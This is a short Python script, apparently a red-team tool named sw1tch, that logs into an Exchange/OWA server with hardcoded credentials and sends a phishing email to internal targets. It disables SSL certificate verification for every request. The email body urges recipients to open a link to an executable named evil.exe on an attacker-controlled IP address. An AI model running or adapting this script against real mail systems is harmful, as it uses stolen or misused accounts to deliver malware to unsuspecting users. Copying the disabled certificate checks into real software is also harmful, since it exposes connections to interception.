#!/usr/bin/env python3

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from requests.sessions import Session
from exchangelib import Credentials, Configuration, Account, DELEGATE, FileAttachment, HTMLBody, Message, Mailbox
from exchangelib.protocol import BaseProtocol

print(' _                          ___     _  _ ')
print('/ \ \    / /\     |\/|  /\   |  |  |_ |_)')
print('\_/  \/\/ /--\    |  | /--\ _|_ |_ |_ | \\')
print("")
print('sw1tch v1.0 Jan 2024')
print("")

# Suppress only the single InsecureRequestWarning from urllib3
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
print("[*] Setting up and configuring to ignore SSL cert...")

# Function to bypass SSL verification globally for exchangelib
class NoVerifyHTTPAdapter(requests.adapters.HTTPAdapter):
    def cert_verify(self, conn, url, verify, cert):
        super().cert_verify(conn=conn, url=url, verify=False, cert=cert)

# Apply NoVerifyHTTPAdapter to ignore presented cert validity
BaseProtocol.HTTP_ADAPTER_CLS = NoVerifyHTTPAdapter

# OWA credential & server details
username = 'domain\\username'
password = 'Passw0rd123'
server = '10.10.110.1'  

# Set up credentials & account
print("[*] Configuring creds and account for " + username + "...")
credentials = Credentials(username, password)
config = Configuration(server=server, credentials=credentials)
account = Account(primary_smtp_address='user@domain.local', config=config, autodiscover=False, access_type=DELEGATE)

# Send email to targets
recipient_emails = ['target1@domain.local', 'target2@domain.local']
subject = 'test'
body = 'Open this! http://10.10.10.10/evil.exe'

message = Message(
    account=account,
    folder=account.sent,
    subject=subject,
    body=HTMLBody(body),
    to_recipients=[Mailbox(email_address=email) for email in recipient_emails]
)

message.send_and_save()
print(f"[*] Email sent successfully to {', '.join(recipient_emails)}")
